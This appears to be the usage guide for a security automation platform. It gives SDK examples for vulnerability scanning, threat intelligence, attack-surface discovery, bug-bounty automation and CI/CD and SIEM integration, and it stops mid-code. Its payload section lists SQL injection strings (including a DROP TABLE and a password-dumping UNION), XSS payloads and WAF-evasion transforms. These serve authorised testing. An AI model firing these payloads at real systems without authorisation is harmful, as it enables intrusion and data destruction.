# Cyinnove Usage Guide

## Overview

This guide provides practical examples and step-by-step tutorials for using Cyinnove's security automation platform. Whether you're a bug hunter, security researcher, or threat hunter, this guide will help you get started quickly and effectively use our tools.

## Table of Contents

- [Getting Started](#getting-started)
  - [Account Setup](#account-setup)
  - [API Key Configuration](#api-key-configuration)
  - [Installation](#installation)
- [Quick Start Tutorials](#quick-start-tutorials)
  - [Your First Vulnerability Scan](#your-first-vulnerability-scan)
  - [Threat Intelligence Analysis](#threat-intelligence-analysis)
  - [Attack Surface Discovery](#attack-surface-discovery)
- [Advanced Use Cases](#advanced-use-cases)
  - [Automated Security Workflows](#automated-security-workflows)
  - [Custom Payload Generation](#custom-payload-generation)
  - [Behavioral Analysis](#behavioral-analysis)
- [Integration Examples](#integration-examples)
  - [CI/CD Pipeline Integration](#cicd-pipeline-integration)
  - [SIEM Integration](#siem-integration)
  - [Custom Dashboard Creation](#custom-dashboard-creation)
- [Best Practices](#best-practices)
- [Troubleshooting](#troubleshooting)

## Getting Started

### Account Setup

1. **Sign up for a Cyinnove account** at [https://cyinnove.org/signup](https://cyinnove.org/signup)
2. **Choose your plan** based on your needs:
   - **Community**: Free tier with basic features
   - **Professional**: Advanced features for security professionals
   - **Enterprise**: Full feature set with custom integrations

3. **Verify your email** and complete the onboarding process

### API Key Configuration

Once you have an account, generate your API key:

1. Log into the Cyinnove dashboard
2. Navigate to **Settings** > **API Keys**
3. Click **Generate New Key**
4. Copy your API key (format: `cy_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`)
5. Store it securely - you'll need it for all API calls

### Installation

#### Python SDK Installation

```bash
# Install the Cyinnove Python SDK
pip install cyinnove-sdk

# Or install from source
git clone https://github.com/CyinnoveOrg/cyinnove-python-sdk.git
cd cyinnove-python-sdk
pip install -e .
```

#### JavaScript SDK Installation

```bash
# Install via npm
npm install cyinnove-sdk

# Or via yarn
yarn add cyinnove-sdk
```

#### Command Line Tool Installation

```bash
# Install the CLI tool
pip install cyinnove-cli

# Verify installation
cyinnove --version
```

## Quick Start Tutorials

### Your First Vulnerability Scan

Let's start with a simple vulnerability scan of a web application:

#### Python Example

```python
from cyinnove import CyinnoveClient
from cyinnove.scanners import VulnerabilityScanner

# Initialize the client
client = CyinnoveClient(api_key="cy_your_api_key_here")

# Create a vulnerability scanner
scanner = VulnerabilityScanner(
    api_key="cy_your_api_key_here",
    target_url="https://example-target.com/login"
)

# Define parameters to test
test_parameters = ['username', 'password', 'email']

# Scan for SQL injection vulnerabilities
print("Starting SQL injection scan...")
sql_results = scanner.scan_sql_injection(test_parameters)

print(f"Scan completed in {sql_results['scan_time']:.2f} seconds")
print(f"Total tests performed: {sql_results['total_tests']}")
print(f"Vulnerabilities found: {len(sql_results['vulnerabilities'])}")

# Display vulnerabilities
for vuln in sql_results['vulnerabilities']:
    print(f"\n🚨 {vuln['type'].upper()} VULNERABILITY FOUND!")
    print(f"Parameter: {vuln['parameter']}")
    print(f"Payload: {vuln['payload']}")
    print(f"Severity: {vuln['severity']}")
    print(f"Description: {vuln['description']}")

# Scan for XSS vulnerabilities
print("\nStarting XSS scan...")
xss_results = scanner.scan_xss(test_parameters)

print(f"XSS scan completed in {xss_results['scan_time']:.2f} seconds")
print(f"XSS vulnerabilities found: {len(xss_results['vulnerabilities'])}")

# Submit vulnerability reports to Cyinnove platform
for vuln in sql_results['vulnerabilities'] + xss_results['vulnerabilities']:
    vulnerability_report = {
        "title": f"{vuln['type'].replace('_', ' ').title()} in {vuln['parameter']} parameter",
        "description": f"A {vuln['type']} vulnerability was found in the {vuln['parameter']} parameter. {vuln['description']}",
        "severity": vuln['severity'],
        "affected_assets": ["web-application"],
        "proof_of_concept": f"Payload used: {vuln['payload']}",
        "remediation_suggestion": "Implement proper input validation and output encoding"
    }
    
    # Submit to platform
    result = client.create_vulnerability(
        title=vulnerability_report["title"],
        description=vulnerability_report["description"],
        severity=vulnerability_report["severity"],
        affected_assets=vulnerability_report["affected_assets"],
        proof_of_concept=vulnerability_report["proof_of_concept"],
        remediation_suggestion=vulnerability_report["remediation_suggestion"]
    )
    
    print(f"✅ Vulnerability report submitted: {result['id']}")
```

#### JavaScript Example

```javascript
const { CyinnoveAPI } = require('cyinnove-sdk');

async function performVulnerabilityScan() {
    // Initialize the API client
    const api = new CyinnoveAPI('cy_your_api_key_here');
    
    try {
        // Get existing vulnerabilities for context
        const existingVulns = await api.getVulnerabilities({
            status: 'open',
            limit: 5
        });
        
        console.log(`Found ${existingVulns.data.length} existing open vulnerabilities`);
        
        // Create a new vulnerability report
        const newVulnerability = {
            title: 'Cross-Site Scripting in Comment System',
            description: 'A stored XSS vulnerability was discovered in the comment submission form that allows attackers to inject malicious JavaScript code.',
            severity: 'medium',
            affected_assets: ['web-app-comments', 'user-dashboard'],
            proof_of_concept: 'Payload: <script>alert("XSS")</script> successfully executed when submitted in comment field',
            remediation_suggestion: 'Implement proper input validation, output encoding, and Content Security Policy (CSP) headers'
        };
        
        // Submit the vulnerability
        const result = await api.createVulnerability(newVulnerability);
        console.log(`✅ New vulnerability created: ${result.id}`);
        
        // Update vulnerability status workflow
        setTimeout(async () => {
            await api.updateVulnerability(result.id, { 
                status: 'in_progress',
                assigned_to: 'security-team'
            });
            console.log('🔄 Vulnerability status updated to in_progress');
        }, 2000);
        
    } catch (error) {
        console.error('❌ Error during vulnerability scan:', error.message);
    }
}

// Run the scan
performVulnerabilityScan();
```

#### Command Line Example

```bash
# Set your API key as an environment variable
export CYINNOVE_API_KEY="cy_your_api_key_here"

# Perform a quick vulnerability scan
cyinnove scan --target "https://example-target.com" --scan-type "sql,xss" --parameters "username,password,email"

# Get vulnerability reports
cyinnove vulnerabilities list --severity high --status open

# Create a vulnerability report
cyinnove vulnerabilities create \
    --title "SQL Injection in Login Form" \
    --description "SQL injection vulnerability found in authentication system" \
    --severity "high" \
    --assets "web-app-1,database-1"
```

### Threat Intelligence Analysis

Analyze suspicious indicators and track threat campaigns:

#### Python Example

```python
from cyinnove.intelligence import ThreatIntelligenceAnalyzer

# Initialize the threat intelligence analyzer
analyzer = ThreatIntelligenceAnalyzer("cy_your_api_key_here")

# Analyze suspicious indicators
suspicious_indicators = [
    "192.168.1.100",
    "malicious-domain.com",
    "e3b0c44298fc1c149afbf4c8996fb924",
    "attacker@evil.com"
]

print("🔍 Analyzing threat indicators...")

for indicator in suspicious_indicators:
    # Determine indicator type
    if "." in indicator and len(indicator.split(".")) == 4:
        indicator_type = "ip"
    elif "@" in indicator:
        indicator_type = "email"
    elif len(indicator) == 32 and all(c in "0123456789abcdef" for c in indicator.lower()):
        indicator_type = "hash"
    else:
        indicator_type = "domain"
    
    # Analyze the indicator
    analysis = analyzer.analyze_ioc(indicator, indicator_type)
    
    print(f"\n📊 Analysis for {indicator} ({indicator_type.upper()}):")
    print(f"   Threat Score: {analysis.get('threat_score', 'N/A')}/100")
    print(f"   Classification: {analysis.get('classification', 'Unknown')}")
    print(f"   First Seen: {analysis.get('first_seen', 'Unknown')}")
    print(f"   Last Seen: {analysis.get('last_seen', 'Unknown')}")
    
    if analysis.get('threat_score', 0) > 70:
        print("   🚨 HIGH RISK - Immediate action recommended")
    elif analysis.get('threat_score', 0) > 40:
        print("   ⚠️  MEDIUM RISK - Monitor closely")
    else:
        print("   ✅ LOW RISK - Appears benign")

# Track a threat campaign
print("\n🎯 Tracking threat campaign...")
campaign_indicators = [
    {"indicator": "malicious-domain.com", "type": "domain"},
    {"indicator": "192.168.1.100", "type": "ip"},
    {"indicator": "e3b0c44298fc1c149afbf4c8996fb924", "type": "hash"}
]

campaign_analysis = analyzer.track_campaign(campaign_indicators)

print(f"Campaign Analysis:")
print(f"   Campaign ID: {campaign_analysis.get('campaign_id', 'Unknown')}")
print(f"   Threat Actor: {campaign_analysis.get('threat_actor', 'Unknown')}")
print(f"   Confidence: {campaign_analysis.get('confidence', 0)}%")
print(f"   Active Since: {campaign_analysis.get('first_activity', 'Unknown')}")
print(f"   Last Activity: {campaign_analysis.get('last_activity', 'Unknown')}")
```

#### Automated Threat Feed Integration

```python
import schedule
import time
from datetime import datetime

def automated_threat_analysis():
    """Automated threat intelligence analysis that runs every hour"""
    analyzer = ThreatIntelligenceAnalyzer("cy_your_api_key_here")
    client = CyinnoveClient("cy_your_api_key_here")
    
    print(f"🤖 Starting automated threat analysis at {datetime.now()}")
    
    # Get recent threat indicators from your feeds
    # This would typically integrate with your SIEM or threat feeds
    recent_indicators = [
        "suspicious-new-domain.com",
        "198.51.100.42",
        "a1b2c3d4e5f6789012345678901234567890abcd"
    ]
    
    high_risk_indicators = []
    
    for indicator in recent_indicators:
        # Determine type and analyze
        indicator_type = determine_indicator_type(indicator)
        analysis = analyzer.analyze_ioc(indicator, indicator_type)
        
        if analysis.get('threat_score', 0) > 80:
            high_risk_indicators.append({
                'indicator': indicator,
                'type': indicator_type,
                'score': analysis.get('threat_score'),
                'classification': analysis.get('classification')
            })
    
    # Create incidents for high-risk indicators
    for threat in high_risk_indicators:
        incident = {
            "title": f"High-Risk Threat Indicator Detected: {threat['indicator']}",
            "description": f"Automated analysis detected a high-risk {threat['type']} indicator with threat score {threat['score']}/100. Classification: {threat['classification']}",
            "severity": "high",
            "category": "threat_intelligence",
            "affected_systems": ["network", "endpoints"],
            "reporter_id": "automated_system"
        }
        
        result = client.create_incident(incident)
        print(f"🚨 High-risk incident created: {result['id']} for indicator {threat['indicator']}")
    
    print(f"✅ Automated analysis completed. {len(high_risk_indicators)} high-risk indicators found.")

def determine_indicator_type(indicator):
    """Helper function to determine indicator type"""
    if "." in indicator and len(indicator.split(".")) == 4:
        return "ip"
    elif "@" in indicator:
        return "email"
    elif len(indicator) in [32, 40, 64, 128] and all(c in "0123456789abcdef" for c in indicator.lower()):
        return "hash"
    elif "http" in indicator:
        return "url"
    else:
        return "domain"

# Schedule automated analysis every hour
schedule.every().hour.do(automated_threat_analysis)

print("🔄 Automated threat intelligence analysis scheduled to run every hour")
print("Press Ctrl+C to stop")

# Keep the script running
while True:
    schedule.run_pending()
    time.sleep(60)
```

### Attack Surface Discovery

Discover and monitor your organization's external attack surface:

#### Python Example

```python
from cyinnove.discovery import AttackSurfaceMapper

# Initialize attack surface mapper
mapper = AttackSurfaceMapper("cy_your_api_key_here")

# Discover assets for your organization
target_domain = "example-company.com"

print(f"🔍 Discovering attack surface for {target_domain}...")

# Comprehensive asset discovery
assets = mapper.discover_assets(
    domain=target_domain,
    include_subdomains=True,
    scan_ports=True,
    deep_scan=True
)

print(f"✅ Discovery completed. Found {len(assets.get('discovered_assets', []))} assets")

# Analyze discovered assets
print("\n📊 Attack Surface Summary:")
print(f"   Subdomains: {len(assets.get('subdomains', []))}")
print(f"   IP Addresses: {len(assets.get('ip_addresses', []))}")
print(f"   Open Ports: {len(assets.get('open_ports', []))}")
print(f"   Services: {len(assets.get('services', []))}")
print(f"   Technologies: {len(assets.get('technologies', []))}")

# Highlight high-risk findings
high_risk_assets = []
for asset in assets.get('discovered_assets', []):
    risk_score = asset.get('risk_score', 0)
    if risk_score > 70:
        high_risk_assets.append(asset)

if high_risk_assets:
    print(f"\n🚨 {len(high_risk_assets)} HIGH-RISK ASSETS FOUND:")
    for asset in high_risk_assets:
        print(f"   • {asset['hostname']} (Risk Score: {asset['risk_score']}/100)")
        print(f"     Issues: {', '.join(asset.get('security_issues', []))}")
        print(f"     Open Ports: {', '.join(map(str, asset.get('open_ports', [])))}")

# Generate security recommendations
print("\n💡 Security Recommendations:")
recommendations = mapper.generate_recommendations(assets)
for i, rec in enumerate(recommendations, 1):
    print(f"{i}. {rec['title']}")
    print(f"   Priority: {rec['priority']}")
    print(f"   Description: {rec['description']}")
    print(f"   Action: {rec['recommended_action']}\n")

# Set up monitoring for the discovered assets
print("🔔 Setting up continuous monitoring...")
monitoring_config = {
    "assets": [asset['hostname'] for asset in assets.get('discovered_assets', [])],
    "scan_frequency": "daily",
    "alert_thresholds": {
        "new_subdomain": True,
        "new_open_port": True,
        "certificate_expiry": 30,  # days
        "security_score_drop": 10  # points
    },
    "notification_channels": ["email", "slack"]
}

monitoring_result = mapper.setup_monitoring(monitoring_config)
print(f"✅ Monitoring configured: {monitoring_result['monitoring_id']}")
```

#### Continuous Attack Surface Monitoring

```python
class AttackSurfaceMonitor:
    """Continuous monitoring of attack surface changes"""
    
    def __init__(self, api_key, domains_to_monitor):
        self.api_key = api_key
        self.domains = domains_to_monitor
        self.mapper = AttackSurfaceMapper(api_key)
        self.client = CyinnoveClient(api_key)
        self.previous_assets = {}
    
    def monitor_changes(self):
        """Check for changes in attack surface"""
        print(f"🔍 Monitoring attack surface changes for {len(self.domains)} domains...")
        
        for domain in self.domains:
            current_assets = self.mapper.discover_assets(
                domain=domain,
                include_subdomains=True,
                scan_ports=False  # Quick scan for monitoring
            )
            
            # Compare with previous scan
            if domain in self.previous_assets:
                changes = self._detect_changes(
                    self.previous_assets[domain],
                    current_assets
                )
                
                if changes:
                    self._handle_changes(domain, changes)
            
            # Update previous assets
            self.previous_assets[domain] = current_assets
    
    def _detect_changes(self, previous, current):
        """Detect changes between asset scans"""
        changes = {
            'new_subdomains': [],
            'removed_subdomains': [],
            'new_ips': [],
            'new_ports': [],
            'certificate_changes': []
        }
        
        # Check for new subdomains
        prev_subdomains = set(previous.get('subdomains', []))
        curr_subdomains = set(current.get('subdomains', []))
        
        changes['new_subdomains'] = list(curr_subdomains - prev_subdomains)
        changes['removed_subdomains'] = list(prev_subdomains - curr_subdomains)
        
        # Check for new IP addresses
        prev_ips = set(previous.get('ip_addresses', []))
        curr_ips = set(current.get('ip_addresses', []))
        changes['new_ips'] = list(curr_ips - prev_ips)
        
        return changes
    
    def _handle_changes(self, domain, changes):
        """Handle detected changes"""
        print(f"🚨 Changes detected for {domain}:")
        
        # Alert on new subdomains
        if changes['new_subdomains']:
            print(f"   New subdomains: {', '.join(changes['new_subdomains'])}")
            
            # Create incident for new subdomains
            incident = {
                "title": f"New Subdomains Discovered for {domain}",
                "description": f"Monitoring detected {len(changes['new_subdomains'])} new subdomains: {', '.join(changes['new_subdomains'])}",
                "severity": "medium",
                "category": "attack_surface_change",
                "affected_systems": [domain]
            }
            
            result = self.client.create_incident(incident)
            print(f"   📝 Incident created: {result['id']}")
        
        # Alert on removed subdomains
        if changes['removed_subdomains']:
            print(f"   Removed subdomains: {', '.join(changes['removed_subdomains'])}")
        
        # Alert on new IPs
        if changes['new_ips']:
            print(f"   New IP addresses: {', '.join(changes['new_ips'])}")

# Usage
monitor = AttackSurfaceMonitor(
    api_key="cy_your_api_key_here",
    domains_to_monitor=["company.com", "app.company.com", "api.company.com"]
)

# Schedule monitoring to run every 6 hours
schedule.every(6).hours.do(monitor.monitor_changes)

print("🔄 Attack surface monitoring started")
while True:
    schedule.run_pending()
    time.sleep(300)  # Check every 5 minutes for scheduled tasks
```

## Advanced Use Cases

### Automated Security Workflows

Create sophisticated security automation workflows:

#### Bug Bounty Automation Pipeline

```python
class BugBountyPipeline:
    """Automated bug bounty hunting pipeline"""
    
    def __init__(self, api_key, target_programs):
        self.api_key = api_key
        self.target_programs = target_programs
        self.client = CyinnoveClient(api_key)
        self.scanner = VulnerabilityScanner(api_key, "")
        self.mapper = AttackSurfaceMapper(api_key)
    
    def run_pipeline(self, target_domain):
        """Execute complete bug bounty pipeline"""
        print(f"🎯 Starting bug bounty pipeline for {target_domain}")
        
        # Phase 1: Reconnaissance
        assets = self._reconnaissance_phase(target_domain)
        
        # Phase 2: Vulnerability Discovery
        vulnerabilities = self._vulnerability_discovery_phase(assets)
        
        # Phase 3: Validation and Reporting
        validated_vulns = self._validation_phase(vulnerabilities)
        
        # Phase 4: Report Generation
        reports = self._generate_reports(validated_vulns)
        
        print(f"✅ Pipeline completed. Found {len(validated_vulns)} validated vulnerabilities")
        return reports
    
    def _reconnaissance_phase(self, domain):
        """Comprehensive reconnaissance"""
        print("🔍 Phase 1: Reconnaissance")
        
        # Discover attack surface
        assets = self.mapper.discover_assets(
            domain=domain,
            include_subdomains=True,
            scan_ports=True,
            deep_scan=True
        )
        
        # Enhance with additional intelligence
        enhanced_assets = []
        for asset in assets.get('discovered_assets', []):
            # Technology detection
            tech_stack = self._detect_technologies(asset['hostname'])
            asset['technologies'] = tech_stack
            
            # Check for common endpoints
            endpoints = self._discover_endpoints(asset['hostname'])
            asset['endpoints'] = endpoints
            
            enhanced_assets.append(asset)
        
        print(f"   📊 Discovered {len(enhanced_assets)} assets")
        return enhanced_assets
    
    def _vulnerability_discovery_phase(self, assets):
        """Automated vulnerability discovery"""
        print("🔎 Phase 2: Vulnerability Discovery")
        
        all_vulnerabilities = []
        
        for asset in assets:
            hostname = asset['hostname']
            print(f"   Scanning {hostname}...")
            
            # Test common endpoints
            for endpoint in asset.get('endpoints', []):
                target_url = f"https://{hostname}{endpoint}"
                self.scanner.target_url = target_url
                
                # SQL Injection testing
                sql_vulns = self.scanner.scan_sql_injection(['id', 'user', 'search', 'q'])
                all_vulnerabilities.extend(sql_vulns['vulnerabilities'])
                
                # XSS testing
                xss_vulns = self.scanner.scan_xss(['comment', 'message', 'name', 'search'])
                all_vulnerabilities.extend(xss_vulns['vulnerabilities'])
                
                # Technology-specific tests
                for tech in asset.get('technologies', []):
                    tech_vulns = self._technology_specific_tests(target_url, tech)
                    all_vulnerabilities.extend(tech_vulns)
        
        print(f"   🎯 Found {len(all_vulnerabilities)} potential vulnerabilities")
        return all_vulnerabilities
    
    def _validation_phase(self, vulnerabilities):
        """Validate and prioritize vulnerabilities"""
        print("✅ Phase 3: Validation and Prioritization")
        
        validated_vulns = []
        
        for vuln in vulnerabilities:
            # Manual validation checks
            if self._validate_vulnerability(vuln):
                # Calculate impact score
                impact_score = self._calculate_impact_score(vuln)
                vuln['impact_score'] = impact_score
                
                # Check exploitability
                exploitability = self._check_exploitability(vuln)
                vuln['exploitability'] = exploitability
                
                # Only include high-confidence findings
                if vuln.get('confidence', 0) > 0.8 and impact_score > 6:
                    validated_vulns.append(vuln)
        
        print(f"   ✅ Validated {len(validated_vulns)} high-confidence vulnerabilities")
        return validated_vulns
    
    def _generate_reports(self, vulnerabilities):
        """Generate comprehensive vulnerability reports"""
        print("📝 Phase 4: Report Generation")
        
        reports = []
        
        for vuln in vulnerabilities:
            # Create detailed report
            report = {
                "title": self._generate_title(vuln),
                "description": self._generate_description(vuln),
                "severity": self._calculate_severity(vuln),
                "impact": self._describe_impact(vuln),
                "proof_of_concept": self._create_poc(vuln),
                "remediation": self._suggest_remediation(vuln),
                "references": self._get_references(vuln)
            }
            
            # Submit to platform
            result = self.client.create_vulnerability(
                title=report["title"],
                description=report["description"],
                severity=report["severity"],
                affected_assets=[vuln.get('target_url', 'unknown')],
                proof_of_concept=report["proof_of_concept"],
                remediation_suggestion=report["remediation"]
            )
            
            report['cyinnove_id'] = result['id']
            reports.append(report)
        
        print(f"   📄 Generated {len(reports)} detailed reports")
        return reports
    
    def _detect_technologies(self, hostname):
        """Detect technologies used by the target"""
        # This would integrate with tools like Wappalyzer or custom detection
        return ["WordPress", "MySQL", "PHP"]  # Example
    
    def _discover_endpoints(self, hostname):
        """Discover common endpoints and paths"""
        common_endpoints = [
            "/admin", "/login", "/api", "/search", "/contact",
            "/upload", "/dashboard", "/profile", "/settings"
        ]
        return common_endpoints  # In practice, you'd test these
    
    def _technology_specific_tests(self, target_url, technology):
        """Run technology-specific vulnerability tests"""
        vulns = []
        
        if technology == "WordPress":
            # WordPress-specific tests
            wp_vulns = self._test_wordpress_vulns(target_url)
            vulns.extend(wp_vulns)
        elif technology == "PHP":
            # PHP-specific tests
            php_vulns = self._test_php_vulns(target_url)
            vulns.extend(php_vulns)
        
        return vulns
    
    def _validate_vulnerability(self, vuln):
        """Validate vulnerability with additional checks"""
        # Implement validation logic
        return True  # Simplified
    
    def _calculate_impact_score(self, vuln):
        """Calculate CVSS-like impact score"""
        base_score = 5.0
        
        if vuln['type'] == 'sql_injection':
            base_score = 8.5
        elif vuln['type'] == 'xss':
            base_score = 6.5
        elif vuln['type'] == 'command_injection':
            base_score = 9.0
        
        return base_score

# Usage
pipeline = BugBountyPipeline(
    api_key="cy_your_api_key_here",
    target_programs=["company.com", "app.company.com"]
)

# Run pipeline for each target
for target in pipeline.target_programs:
    reports = pipeline.run_pipeline(target)
    print(f"Generated {len(reports)} reports for {target}")
```

### Custom Payload Generation

Create sophisticated, context-aware payloads:

#### Advanced Payload Generator

```python
from cyinnove.payloads import PayloadGenerator, PayloadType
import base64
import urllib.parse

class AdvancedPayloadGenerator(PayloadGenerator):
    """Extended payload generator with advanced features"""
    
    def generate_context_aware_payloads(self, 
                                      target_context,
                                      vulnerability_type,
                                      encoding_methods=None):
        """Generate payloads tailored to specific contexts"""
        
        encoding_methods = encoding_methods or ['none', 'url', 'base64', 'html']
        payloads = []
        
        # Base payload selection
        if vulnerability_type == PayloadType.SQL_INJECTION:
            base_payloads = self._get_context_sql_payloads(target_context)
        elif vulnerability_type == PayloadType.XSS:
            base_payloads = self._get_context_xss_payloads(target_context)
        else:
            base_payloads = ["test_payload"]
        
        # Apply different encoding methods
        for base_payload in base_payloads:
            for encoding in encoding_methods:
                encoded_payload = self._apply_encoding(base_payload, encoding)
                
                payloads.append({
                    'payload': encoded_payload,
                    'original': base_payload,
                    'encoding': encoding,
                    'context': target_context,
                    'type': vulnerability_type.value,
                    'confidence': self._calculate_payload_confidence(
                        base_payload, target_context, encoding
                    )
                })
        
        # Sort by confidence
        payloads.sort(key=lambda x: x['confidence'], reverse=True)
        return payloads
    
    def _get_context_sql_payloads(self, context):
        """Get SQL payloads based on context"""
        payloads = {
            'login_form': [
                "admin'--",
                "' OR '1'='1'--",
                "admin' OR '1'='1'#"
            ],
            'search_box': [
                "' UNION SELECT username,password FROM users--",
                "' AND 1=2 UNION SELECT 1,version()--",
                "' ORDER BY 10--"
            ],
            'numeric_input': [
                "1 OR 1=1",
                "1 UNION SELECT 1,2,3--",
                "1; DROP TABLE users--"
            ],
            'generic': [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; WAITFOR DELAY '00:00:05'--"
            ]
        }
        
        return payloads.get(context, payloads['generic'])
    
    def _get_context_xss_payloads(self, context):
        """Get XSS payloads based on context"""
        payloads = {
            'comment_field': [
                "<script>alert('Stored XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')></svg>"
            ],
            'url_parameter': [
                "javascript:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "vbscript:alert('XSS')"
            ],
            'form_input': [
                "\"><script>alert('XSS')</script>",
                "' onfocus=alert('XSS') autofocus='",
                "</script><script>alert('XSS')</script>"
            ],
            'json_input': [
                "\"},alert('XSS'),{\"a\":\"",
                "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
                "\";alert('XSS');//"
            ]
        }
        
        return payloads.get(context, payloads['form_input'])
    
    def _apply_encoding(self, payload, encoding_method):
        """Apply various encoding methods to payloads"""
        if encoding_method == 'url':
            return urllib.parse.quote(payload)
        elif encoding_method == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding_method == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding_method == 'html':
            return payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
        elif encoding_method == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        else:
            return payload
    
    def generate_evasion_payloads(self, base_payload, evasion_techniques):
        """Generate payloads with WAF evasion techniques"""
        evasion_payloads = []
        
        for technique in evasion_techniques:
            if technique == 'case_variation':
                # Mix upper and lower case
                evaded = ''.join(c.upper() if i % 2 else c.lower() 
                               for i, c in enumerate(base_payload))
            
            elif technique == 'comment_insertion':
                # Insert SQL comments
                evaded = base_payload.replace('SELECT', 'SEL/**/ECT')
                evaded = evaded.replace('UNION', 'UNI/**/ON')
            
            elif technique == 'whitespace_variation':
                # Use different whitespace characters
                evaded = base_payload.replace(' ', '\t')
                evaded = evaded.replace(' ', '\n')
            
            elif technique == 'keyword_splitting':
                # Split keywords with functions
                evaded = base_payload.replace('script', 'scr'+'ipt')
                evaded = evaded.replace('alert', 'ale'+'rt')
            
            else:
                evaded = base_payload
            
            evasion_payloads.append({
                'payload': evaded,
                'technique': technique,
                'original': base_payload
            })
        
        return evasion_payloads

# Usage Example
advanced_generator = AdvancedPayloadGenerator()

# Generate context-aware SQL injection payloads for a login form
login_payloads = advanced_generator.generate_context_aware_payloads(
    target_context='login_form',
    vulnerability_type=PayloadType.SQL_INJECTION,
    encoding_methods=['none', 'url', 'double_url']
)

print("🎯 Context-Aware SQL Injection Payloads for Login Form:")
for payload in login_payloads[:5]:  # Show top 5
    print(f"   Payload: {payload['payload']}")
    print(f"   Encoding: {payload['encoding']}")
    print(f"   Confidence: {payload['confidence']:.2f}")
    print()

# Generate XSS payloads for JSON input with evasion
json_xss_payloads = advanced_generator.generate_context_aware_payloads(
    target_context='json_input',
    vulnerability_type=PayloadType.XSS,
    encoding_methods=['none', 'unicode']
)

print("🎯 XSS Payloads for JSON Input:")
for payload in json_xss_payloads[:3]:
    print(f"   Payload: {payload['payload']}")
    print(f"   Context: {payload['context']}")
    print()

# Generate WAF evasion payloads
base_xss = "<script>alert('XSS')</script>"
evasion_payloads = advanced_generator.generate_evasion_payloads(
    base_xss,
    ['case_variation', 'keyword_splitting', 'whitespace_variation']
)

print("🛡️ WAF Evasion Payloads:")
for payload in evasion_payloads:
    print(f"   Technique: {payload['technique']}")
    print(f"   Payload: {payload['payload']}")
    print()
```

## Integration Examples

### CI/CD Pipeline Integration

Integrate security scanning into your development pipeline:

#### GitHub Actions Integration

```yaml
# .github/workflows/security-scan.yml
name: Security Scan with Cyinnove

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v3
      with:
        python-version: '3.9'
    
    - name: Install Cyinnove CLI
      run: |
        pip install cyinnove-cli
    
    - name: Run Security Scan
      env:
        CYINNOVE_API_KEY: ${{ secrets.CYINNOVE_API_KEY }}
      run: |
        # Static code analysis
        cyinnove scan --type static --path . --output json > static_results.json
        
        # Dependency vulnerability check
        cyinnove scan --type dependencies --path . --output json > deps_results.json
        
        # Container security scan (if Dockerfile exists)
        if [ -f "Dockerfile" ]; then
          cyinnove scan --type container --path . --output json > container_results.json
        fi
    
    - name: Process Results
      run: |
        python .github/scripts/process_security_results.py
    
    - name: Upload Results
      uses: actions/upload-artifact@v3
      with:
        name: security-scan-results
        path: |
          static_results.json
          deps_results.json
          container_results.json
    
    - name: Comment PR
      if: github.event_name == 'pull_request'
      uses: actions/github-script@v6
      with:
        script: |
          const fs = require('fs');
          
          // Read scan results
          let comment = '## 🔒 Security Scan Results\n\n';
          
          try {
            const staticResults = JSON.parse(fs.readFileSync('static_results.json', 'utf8'));
            comment += `**Static Analysis:** ${staticResults.vulnerabilities.length} issues found\n`;
            
            const depsResults = JSON.parse(fs.readFileSync('deps_results.json', 'utf8'));
            comment += `**Dependencies:** ${depsResults.vulnerabilities.length} vulnerable packages\n`;
            
            // Add high-severity findings
            const highSeverity = staticResults.vulnerabilities.filter(v => v.severity === 'high');
            if (highSeverity.length > 0) {
              comment += '\n### 🚨 High Severity Issues:\n';
              highSeverity.forEach(issue => {
                comment += `- **${issue.title}** (${issue.file}:${issue.line})\n`;
              });
            }
            
          } catch (error) {
            comment += 'Error processing scan results.';
          }
          
          github.rest.issues.createComment({
            issue_number: context.issue.number,
            owner: context.repo.owner,
            repo: context.repo.repo,
            body: comment
          });
```

#### Process Security Results Script

```python
# .github/scripts/process_security_results.py
import json
import sys
import os

def process_security_results():
    """Process security scan results and determine if build should fail"""
    
    results_files = ['static_results.json', 'deps_results.json', 'container_results.json']
    total_critical = 0
    total_high = 0
    total_medium = 0
    
    for file_path in results_files:
        if os.path.exists(file_path):
            with open(file_path, 'r') as f:
                results = json.load(f)
                
            for vuln in results.get('vulnerabilities', []):
                severity = vuln.get('severity', '').lower()
                if severity == 'critical':
                    total_critical += 1
                elif severity == 'high':
                    total_high += 1
                elif severity == 'medium':
                    total_medium += 1
    
    print(f"Security Scan Summary:")
    print(f"  Critical: {total_critical}")
    print(f"  High: {total_high}")
    print(f"  Medium: {total_medium}")
    
    # Fail build if critical vulnerabilities found
    if total_critical > 0:
        print("❌ Build failed due to critical security vulnerabilities")
        sys.exit(1)
    
    # Warn on high vulnerabilities
    if total_high > 5:
        print("⚠️  Warning: High number of high-severity vulnerabilities")
        # Could set this to fail as well based on your policy
    
    print("✅ Security scan passed")

if __name__ == "__main__":
    process_security_results()
```

### SIEM Integration

Integrate Cyinnove with your SIEM system:

#### Splunk Integration

```python
import splunklib.client as client
import splunklib.results as results
from cyinnove import CyinnoveClient

class CyinnoveSplunkIntegration:
    """Integration between Cyinnove and Splunk SIEM"""
    
    def __init__(self, cyinnove_api_key, splunk_config):
        self.cyinnove = CyinnoveClient(cyinnove_api_key)
        self.splunk = client.connect(**splunk_config)
        
    def sync_vulnerabilities_to_splunk(self):
        """Sync Cyinnove vulnerabilities to Splunk"""
        
        # Get vulnerabilities from Cyinnove
        vulns = self.cyinnove.get_vulnerabilities(status='open', limit=1000)
        
        # Create Splunk index for vulnerabilities if it doesn't exist
        try:
            vuln_index = self.splunk.indexes['cyinnove_vulnerabilities']
        except KeyError:
            vuln_index = self.splunk.indexes.create('cyinnove_vulnerabilities')
        
        # Send vulnerabilities to Splunk
        for vuln in vulns['data']:
            event_data = {
                'timestamp': vuln['discovered_date'],
                'source': 'cyinnove',
                'sourcetype': 'vulnerability',
